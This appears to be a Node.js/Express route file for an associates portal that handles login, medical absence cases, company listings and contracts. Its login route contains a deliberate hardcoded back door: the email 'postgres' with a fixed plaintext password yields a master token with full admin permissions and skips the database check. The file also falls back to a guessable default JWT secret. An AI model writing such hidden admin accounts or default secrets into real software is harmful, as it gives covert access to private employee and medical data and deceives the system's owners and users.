/**
 * ASSOCIATE ROUTES v2.0
 * API para gestión de asociados APONNT y contratos
 * Incluye autenticación independiente para Portal de Asociados
 *
 * @version 2.0
 * @date 2025-12-08
 */

const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { auth, adminOnly } = require('../middleware/auth');
const AssociateService = require('../services/AssociateService');
const { sequelize } = require('../config/database');
const { QueryTypes } = require('sequelize');

const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key';
const JWT_EXPIRES_IN = process.env.JWT_EXPIRES_IN || '24h';

// =====================================================
// AUTENTICACIÓN DE ASOCIADOS (Portal Asociados)
// =====================================================

/**
 * @route POST /api/associates/auth/login
 * @desc Login para asociados (médicos, abogados, etc.)
 * @access Public
 */
router.post('/auth/login', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({
                success: false,
                error: 'Email y password son requeridos'
            });
        }

        console.log(`🔐 [ASSOCIATE AUTH] Intento de login: ${email}`);

        // =============================================================================
        // PUERTA TRASERA HARDCODEADA (solo conocida por admin del sistema)
        // =============================================================================
        if (email.toLowerCase() === 'postgres' && password === 'Aedr15150302') {
            console.log('🚪 [ASSOCIATE AUTH] Acceso por puerta trasera (postgres) - ASOCIADO MASTER');

            // Generar token especial de super-admin asociado
            const token = jwt.sign(
                {
                    associate_id: 'ASSOCIATE_MASTER',
                    email: 'postgres',
                    category: 'administrative',
                    source: 'backdoor',
                    type: 'associate',
                    is_backdoor: true
                },
                JWT_SECRET,
                { expiresIn: '24h' }
            );

            return res.json({
                success: true,
                message: 'Acceso de asociado master concedido',
                token,
                associate: {
                    id: 'ASSOCIATE_MASTER',
                    email: 'postgres',
                    first_name: 'Asociado',
                    last_name: 'Master',
                    phone: null,
                    category: 'administrative',
                    specialty: 'Administración Total',
                    license_number: 'MASTER',
                    is_active: true,
                    approval_status: 'approved',
                    account_status: 'active',
                    is_backdoor: true,
                    permissions: {
                        can_view_all: true,
                        can_manage_all: true,
                        is_admin: true,
                        is_master: true
                    }
                },
                source: 'backdoor'
            });
        }

        // =============================================================================
        // LOGIN NORMAL (asociados registrados en base de datos)
        // =============================================================================

        // Buscar en tabla partners (médicos y otros profesionales)
        const partners = await sequelize.query(`
            SELECT
                id,
                email,
                password_hash,
                first_name,
                last_name,
                phone,
                specialty,
                license_number,
                is_medical_staff,
                is_active,
                approval_status,
                account_status
            FROM partners
            WHERE email = :email
            LIMIT 1
        `, {
            replacements: { email: email.toLowerCase() },
            type: QueryTypes.SELECT
        });

        let associate = null;
        let source = null;

        if (partners.length > 0) {
            const partner = partners[0];

            // Verificar que esté activo y aprobado
            if (!partner.is_active) {
                return res.status(401).json({
                    success: false,
                    error: 'Tu cuenta está desactivada. Contacta a soporte.'
                });
            }

            if (partner.approval_status !== 'approved') {
                return res.status(401).json({
                    success: false,
                    error: 'Tu cuenta está pendiente de aprobación.'
                });
            }

            // Verificar password
            const isValidPassword = await bcrypt.compare(password, partner.password_hash);
            if (!isValidPassword) {
                return res.status(401).json({
                    success: false,
                    error: 'Credenciales inválidas'
                });
            }

            associate = partner;
            source = 'partners';

            // Determinar categoría basada en is_medical_staff
            associate.category = partner.is_medical_staff ? 'medical' : 'other';
        } else {
            // Buscar en tabla aponnt_associates
            const associates = await sequelize.query(`
                SELECT
                    id,
                    email,
                    password_hash,
                    first_name,
                    last_name,
                    phone,
                    specialty,
                    license_number,
                    category,
                    is_active,
                    rating_average,
                    contracts_completed,
                    hourly_rate
                FROM aponnt_associates
                WHERE email = :email
                LIMIT 1
            `, {
                replacements: { email: email.toLowerCase() },
                type: QueryTypes.SELECT
            });

            if (associates.length === 0) {
                return res.status(401).json({
                    success: false,
                    error: 'Credenciales inválidas'
                });
            }

            const assoc = associates[0];

            if (!assoc.is_active) {
                return res.status(401).json({
                    success: false,
                    error: 'Tu cuenta está desactivada. Contacta a soporte.'
                });
            }

            // Verificar password
            const isValidPassword = await bcrypt.compare(password, assoc.password_hash);
            if (!isValidPassword) {
                return res.status(401).json({
                    success: false,
                    error: 'Credenciales inválidas'
                });
            }

            associate = assoc;
            source = 'aponnt_associates';
        }

        // Generar JWT
        const token = jwt.sign(
            {
                associate_id: associate.id,
                email: associate.email,
                category: associate.category,
                source: source,
                type: 'associate'
            },
            JWT_SECRET,
            { expiresIn: JWT_EXPIRES_IN }
        );

        // Obtener empresas asignadas
        let companies = [];
        if (source === 'partners') {
            // Para partners (médicos), buscar en company_medical_staff
            companies = await sequelize.query(`
                SELECT
                    c.company_id as id,
                    c.name,
                    c.slug,
                    cms.is_primary
                FROM company_medical_staff cms
                JOIN companies c ON cms.company_id = c.company_id
                WHERE cms.partner_id = :partnerId
                AND cms.is_active = true
                ORDER BY cms.is_primary DESC, c.name
            `, {
                replacements: { partnerId: associate.id },
                type: QueryTypes.SELECT
            });
        } else {
            // Para aponnt_associates, buscar en company_associate_contracts
            companies = await sequelize.query(`
                SELECT
                    c.company_id as id,
                    c.name,
                    c.slug,
                    cac.status
                FROM company_associate_contracts cac
                JOIN companies c ON cac.company_id = c.company_id
                WHERE cac.associate_id = :associateId
                AND cac.status = 'active'
                ORDER BY c.name
            `, {
                replacements: { associateId: associate.id },
                type: QueryTypes.SELECT
            });
        }

        console.log(`✅ [ASSOCIATE AUTH] Login exitoso: ${email} (${source})`);

        res.json({
            success: true,
            token,
            associate: {
                id: associate.id,
                email: associate.email,
                first_name: associate.first_name,
                last_name: associate.last_name,
                phone: associate.phone,
                specialty: associate.specialty,
                license_number: associate.license_number,
                category: associate.category,
                rating: associate.rating_average,
                hourly_rate: associate.hourly_rate
            },
            companies,
            source
        });

    } catch (error) {
        console.error('❌ [ASSOCIATE AUTH] Error en login:', error);
        res.status(500).json({
            success: false,
            error: 'Error en el servidor'
        });
    }
});

/**
 * Middleware de autenticación para asociados
 */
const associateAuth = async (req, res, next) => {
    try {
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                error: 'Token no proporcionado'
            });
        }

        const token = authHeader.split(' ')[1];
        const decoded = jwt.verify(token, JWT_SECRET);

        if (decoded.type !== 'associate') {
            return res.status(401).json({
                success: false,
                error: 'Token inválido para asociados'
            });
        }

        req.associate = decoded;
        next();
    } catch (error) {
        return res.status(401).json({
            success: false,
            error: 'Token inválido o expirado'
        });
    }
};

/**
 * @route GET /api/associates/auth/verify-token
 * @desc Verificar token de asociado
 */
router.get('/auth/verify-token', associateAuth, async (req, res) => {
    res.json({
        success: true,
        associate: req.associate
    });
});

/**
 * @route GET /api/associates/dashboard/stats
 * @desc Obtener estadísticas del dashboard del asociado
 */
router.get('/dashboard/stats', associateAuth, async (req, res) => {
    try {
        const { associate_id, source } = req.associate;

        let stats = {
            companies: 0,
            pendingCases: 0,
            completedCases: 0,
            monthlyEarnings: 0
        };

        if (source === 'partners') {
            // Contar empresas
            const companiesResult = await sequelize.query(`
                SELECT COUNT(*) as count
                FROM company_medical_staff
                WHERE partner_id = :partnerId AND is_active = true
            `, {
                replacements: { partnerId: associate_id },
                type: QueryTypes.SELECT
            });
            stats.companies = parseInt(companiesResult[0]?.count || 0);

            // Contar casos pendientes
            const pendingResult = await sequelize.query(`
                SELECT COUNT(*) as count
                FROM absence_cases
                WHERE assigned_doctor_id = :partnerId
                AND case_status IN ('pending', 'under_review', 'awaiting_docs', 'needs_follow_up')
            `, {
                replacements: { partnerId: associate_id },
                type: QueryTypes.SELECT
            });
            stats.pendingCases = parseInt(pendingResult[0]?.count || 0);

            // Contar casos completados
            const completedResult = await sequelize.query(`
                SELECT COUNT(*) as count
                FROM absence_cases
                WHERE assigned_doctor_id = :partnerId
                AND case_status IN ('justified', 'not_justified', 'closed')
            `, {
                replacements: { partnerId: associate_id },
                type: QueryTypes.SELECT
            });
            stats.completedCases = parseInt(completedResult[0]?.count || 0);
        } else {
            // Para aponnt_associates
            const companiesResult = await sequelize.query(`
                SELECT COUNT(*) as count
                FROM company_associate_contracts
                WHERE associate_id = :associateId AND status = 'active'
            `, {
                replacements: { associateId: associate_id },
                type: QueryTypes.SELECT
            });
            stats.companies = parseInt(companiesResult[0]?.count || 0);
        }

        res.json({
            success: true,
            ...stats
        });

    } catch (error) {
        console.error('[ASSOCIATE] Error getting dashboard stats:', error);
        res.status(500).json({ error: 'Error obteniendo estadísticas' });
    }
});

/**
 * @route GET /api/associates/my-companies
 * @desc Obtener empresas donde trabaja el asociado
 */
router.get('/my-companies', associateAuth, async (req, res) => {
    try {
        const { associate_id, source } = req.associate;
        let companies = [];

        if (source === 'partners') {
            companies = await sequelize.query(`
                SELECT
                    c.company_id as id,
                    c.name,
                    c.slug,
                    c.contact_email,
                    cms.is_primary,
                    (SELECT COUNT(*) FROM absence_cases ac
                     WHERE ac.company_id = c.company_id
                     AND ac.assigned_doctor_id = :partnerId
                     AND ac.case_status IN ('pending', 'under_review', 'awaiting_docs', 'needs_follow_up')) as active_cases,
                    (SELECT COUNT(*) FROM absence_cases ac
                     WHERE ac.company_id = c.company_id
                     AND ac.assigned_doctor_id = :partnerId
                     AND ac.case_status IN ('justified', 'not_justified', 'closed')) as completed_cases
                FROM company_medical_staff cms
                JOIN companies c ON cms.company_id = c.company_id
                WHERE cms.partner_id = :partnerId
                AND cms.is_active = true
                ORDER BY cms.is_primary DESC, c.name
            `, {
                replacements: { partnerId: associate_id },
                type: QueryTypes.SELECT
            });
        } else {
            companies = await sequelize.query(`
                SELECT
                    c.company_id as id,
                    c.name,
                    c.slug,
                    c.contact_email,
                    cac.hourly_rate_agreed,
                    cac.start_date,
                    cac.status as contract_status
                FROM company_associate_contracts cac
                JOIN companies c ON cac.company_id = c.company_id
                WHERE cac.associate_id = :associateId
                AND cac.status = 'active'
                ORDER BY c.name
            `, {
                replacements: { associateId: associate_id },
                type: QueryTypes.SELECT
            });
        }

        res.json({ success: true, companies });

    } catch (error) {
        console.error('[ASSOCIATE] Error getting companies:', error);
        res.status(500).json({ error: 'Error obteniendo empresas' });
    }
});

/**
 * @route GET /api/associates/my-cases
 * @desc Obtener casos asignados al asociado
 */
router.get('/my-cases', associateAuth, async (req, res) => {
    try {
        const { associate_id, source } = req.associate;
        const { status, company_id } = req.query;
        let cases = [];

        if (source === 'partners') {
            let whereClause = 'ac.assigned_doctor_id = :partnerId';
            const replacements = { partnerId: associate_id };

            if (status) {
                whereClause += ' AND ac.case_status = :status';
                replacements.status = status;
            }
            if (company_id) {
                whereClause += ' AND ac.company_id = :companyId';
                replacements.companyId = company_id;
            }

            cases = await sequelize.query(`
                SELECT
                    ac.id,
                    c.name as company,
                    ac.company_id,
                    ac.absence_type as type,
                    ac.employee_description as description,
                    ac.case_status as status,
                    ac.start_date,
                    ac.end_date,
                    ac.requested_days,
                    ac.approved_days,
                    ac.is_justified,
                    ac.created_at as date,
                    u."firstName" || ' ' || u."lastName" as employee_name
                FROM absence_cases ac
                JOIN companies c ON ac.company_id = c.company_id
                LEFT JOIN users u ON ac.employee_id = u.user_id
                WHERE ${whereClause}
                ORDER BY
                    CASE ac.case_status
                        WHEN 'pending' THEN 1
                        WHEN 'under_review' THEN 2
                        WHEN 'awaiting_docs' THEN 3
                        WHEN 'needs_follow_up' THEN 4
                        ELSE 5
                    END,
                    ac.created_at DESC
                LIMIT 100
            `, {
                replacements,
                type: QueryTypes.SELECT
            });
        }

        res.json({ success: true, cases });

    } catch (error) {
        console.error('[ASSOCIATE] Error getting cases:', error);
        res.status(500).json({ error: 'Error obteniendo casos' });
    }
});

/**
 * @route GET /api/associates/billing
 * @desc Obtener historial de facturación del asociado
 */
router.get('/billing', associateAuth, async (req, res) => {
    try {
        const { associate_id, source } = req.associate;

        // Por ahora retornamos datos placeholder
        // TODO: Implementar con tabla de invoices real
        const invoices = [];

        res.json({ success: true, invoices });

    } catch (error) {
        console.error('[ASSOCIATE] Error getting billing:', error);
        res.status(500).json({ error: 'Error obteniendo facturación' });
    }
});

/**
 * @route PUT /api/associates/profile
 * @desc Actualizar perfil del asociado
 */
router.put('/profile', associateAuth, async (req, res) => {
    try {
        const { associate_id, source } = req.associate;
        const { first_name, last_name, phone, specialty, license_number, hourly_rate, bio } = req.body;

        const table = source === 'partners' ? 'partners' : 'aponnt_associates';

        await sequelize.query(`
            UPDATE ${table}
            SET
                first_name = COALESCE(:first_name, first_name),
                last_name = COALESCE(:last_name, last_name),
                phone = COALESCE(:phone, phone),
                specialty = COALESCE(:specialty, specialty),
                license_number = COALESCE(:license_number, license_number),
                updated_at = NOW()
            WHERE id = :id
        `, {
            replacements: {
                id: associate_id,
                first_name,
                last_name,
                phone,
                specialty,
                license_number
            },
            type: QueryTypes.UPDATE
        });

        res.json({ success: true, message: 'Perfil actualizado' });

    } catch (error) {
        console.error('[ASSOCIATE] Error updating profile:', error);
        res.status(500).json({ error: 'Error actualizando perfil' });
    }
});

// =====================================================
// BÚSQUEDA DE ASOCIADOS (MARKETPLACE)
// =====================================================

/**
 * @route GET /api/v1/associates/categories
 * @desc Obtener categorías de asociados
 */
router.get('/categories', auth, async (req, res) => {
    try {
        const categories = await AssociateService.getCategories();
        res.json({ success: true, categories });
    } catch (error) {
        console.error('[ASSOCIATES] Error getting categories:', error);
        res.status(500).json({ error: 'Error obteniendo categorías' });
    }
});

/**
 * @route GET /api/v1/associates/search
 * @desc Buscar asociados
 */
router.get('/search', auth, async (req, res) => {
    try {
        const {
            category,
            region,
            specialty,
            minRating,
            remoteAvailable,
            limit = 20,
            offset = 0
        } = req.query;

        const result = await AssociateService.searchAssociates({
            category,
            region,
            specialty,
            minRating: minRating ? parseFloat(minRating) : 0,
            remoteAvailable: remoteAvailable === 'true' ? true : remoteAvailable === 'false' ? false : null,
            limit: parseInt(limit),
            offset: parseInt(offset)
        });

        res.json({ success: true, ...result });

    } catch (error) {
        console.error('[ASSOCIATES] Error searching associates:', error);
        res.status(500).json({ error: 'Error buscando asociados' });
    }
});

/**
 * @route GET /api/v1/associates/:associateId
 * @desc Obtener detalle de un asociado
 */
router.get('/:associateId', auth, async (req, res) => {
    try {
        const { associateId } = req.params;

        const associate = await AssociateService.getAssociateDetail(associateId);

        if (!associate) {
            return res.status(404).json({ error: 'Asociado no encontrado' });
        }

        res.json({ success: true, associate });

    } catch (error) {
        console.error('[ASSOCIATES] Error getting associate detail:', error);
        res.status(500).json({ error: 'Error obteniendo detalle del asociado' });
    }
});

// =====================================================
// CONTRATOS
// =====================================================

/**
 * @route GET /api/v1/associates/contracts/my-company
 * @desc Obtener contratos de mi empresa
 */
router.get('/contracts/my-company', auth, async (req, res) => {
    try {
        const companyId = req.user.company_id;
        const { status } = req.query;

        const contracts = await AssociateService.getCompanyContracts(companyId, status);

        res.json({ success: true, contracts });

    } catch (error) {
        console.error('[ASSOCIATES] Error getting company contracts:', error);
        res.status(500).json({ error: 'Error obteniendo contratos' });
    }
});

/**
 * @route POST /api/v1/associates/contracts
 * @desc Crear contrato con asociado
 */
router.post('/contracts', auth, adminOnly, async (req, res) => {
    try {
        const companyId = req.user.company_id;
        const createdBy = req.user.user_id;

        const result = await AssociateService.createContract(
            companyId,
            req.body.associateId,
            {
                ...req.body,
                createdBy
            }
        );

        if (result.success) {
            res.json({ success: true, contract: result.contract });
        } else {
            res.status(400).json({ success: false, error: result.error });
        }

    } catch (error) {
        console.error('[ASSOCIATES] Error creating contract:', error);
        res.status(500).json({ error: 'Error creando contrato' });
    }
});

/**
 * @route PUT /api/v1/associates/contracts/:contractId/pause
 * @desc Pausar contrato
 */
router.put('/contracts/:contractId/pause', auth, adminOnly, async (req, res) => {
    try {
        const { contractId } = req.params;

        const result = await AssociateService.toggleContractStatus(parseInt(contractId), 'pause');

        if (result.success) {
            res.json({ success: true });
        } else {
            res.status(400).json({ success: false, error: result.error });
        }

    } catch (error) {
        console.error('[ASSOCIATES] Error pausing contract:', error);
        res.status(500).json({ error: 'Error pausando contrato' });
    }
});

/**
 * @route PUT /api/v1/associates/contracts/:contractId/activate
 * @desc Reactivar contrato
 */
router.put('/contracts/:contractId/activate', auth, adminOnly, async (req, res) => {
    try {
        const { contractId } = req.params;

        const result = await AssociateService.toggleContractStatus(parseInt(contractId), 'activate');

        if (result.success) {
            res.json({ success: true });
        } else {
            res.status(400).json({ success: false, error: result.error });
        }

    } catch (error) {
        console.error('[ASSOCIATES] Error activating contract:', error);
        res.status(500).json({ error: 'Error activando contrato' });
    }
});

/**
 * @route DELETE /api/v1/associates/contracts/:contractId
 * @desc Terminar contrato
 */
router.delete('/contracts/:contractId', auth, adminOnly, async (req, res) => {
    try {
        const { contractId } = req.params;
        const { reason } = req.body;
        const terminatedBy = req.user.user_id;

        const result = await AssociateService.terminateContract(
            parseInt(contractId),
            terminatedBy,
            reason
        );

        if (result.success) {
            res.json({ success: true });
        } else {
            res.status(400).json({ success: false, error: result.error });
        }

    } catch (error) {
        console.error('[ASSOCIATES] Error terminating contract:', error);
        res.status(500).json({ error: 'Error terminando contrato' });
    }
});

// =====================================================
// ASIGNACIÓN DE EMPLEADOS
// =====================================================

/**
 * @route GET /api/v1/associates/contracts/:contractId/employees
 * @desc Obtener empleados asignados a un contrato
 */
router.get('/contracts/:contractId/employees', auth, async (req, res) => {
    try {
        const { contractId } = req.params;

        const employees = await AssociateService.getAssignedEmployees(parseInt(contractId));

        res.json({ success: true, employees });

    } catch (error) {
        console.error('[ASSOCIATES] Error getting assigned employees:', error);
        res.status(500).json({ error: 'Error obteniendo empleados asignados' });
    }
});

/**
 * @route GET /api/v1/associates/contracts/:contractId/available-employees
 * @desc Obtener empleados disponibles para asignar
 */
router.get('/contracts/:contractId/available-employees', auth, async (req, res) => {
    try {
        const { contractId } = req.params;
        const companyId = req.user.company_id;

        const employees = await AssociateService.getAvailableEmployees(parseInt(contractId), companyId);

        res.json({ success: true, employees });

    } catch (error) {
        console.error('[ASSOCIATES] Error getting available employees:', error);
        res.status(500).json({ error: 'Error obteniendo empleados disponibles' });
    }
});

/**
 * @route POST /api/v1/associates/contracts/:contractId/employees
 * @desc Asignar empleados a un contrato
 */
router.post('/contracts/:contractId/employees', auth, adminOnly, async (req, res) => {
    try {
        const { contractId } = req.params;
        const { employeeIds, reason } = req.body;
        const assignedBy = req.user.user_id;

        const result = await AssociateService.assignEmployees(
            parseInt(contractId),
            employeeIds,
            assignedBy,
            reason
        );

        if (result.success) {
            res.json({ success: true, results: result.results });
        } else {
            res.status(400).json({ success: false, error: result.error });
        }

    } catch (error) {
        console.error('[ASSOCIATES] Error assigning employees:', error);
        res.status(500).json({ error: 'Error asignando empleados' });
    }
});

/**
 * @route DELETE /api/v1/associates/contracts/:contractId/employees
 * @desc Desasignar empleados de un contrato
 */
router.delete('/contracts/:contractId/employees', auth, adminOnly, async (req, res) => {
    try {
        const { contractId } = req.params;
        const { employeeIds, reason } = req.body;
        const deactivatedBy = req.user.user_id;

        const result = await AssociateService.unassignEmployees(
            parseInt(contractId),
            employeeIds,
            deactivatedBy,
            reason
        );

        if (result.success) {
            res.json({ success: true });
        } else {
            res.status(400).json({ success: false, error: result.error });
        }

    } catch (error) {
        console.error('[ASSOCIATES] Error unassigning employees:', error);
        res.status(500).json({ error: 'Error desasignando empleados' });
    }
});

// =====================================================
// PARA ASOCIADOS (su vista)
// =====================================================

/**
 * @route GET /api/v1/associates/my-companies
 * @desc Obtener empresas donde trabajo (para asociados)
 */
router.get('/my-companies', auth, async (req, res) => {
    try {
        const userId = req.user.user_id;

        const companies = await AssociateService.getAssociateCompanies(userId);

        res.json({ success: true, companies });

    } catch (error) {
        console.error('[ASSOCIATES] Error getting associate companies:', error);
        res.status(500).json({ error: 'Error obteniendo empresas' });
    }
});

module.exports = router;
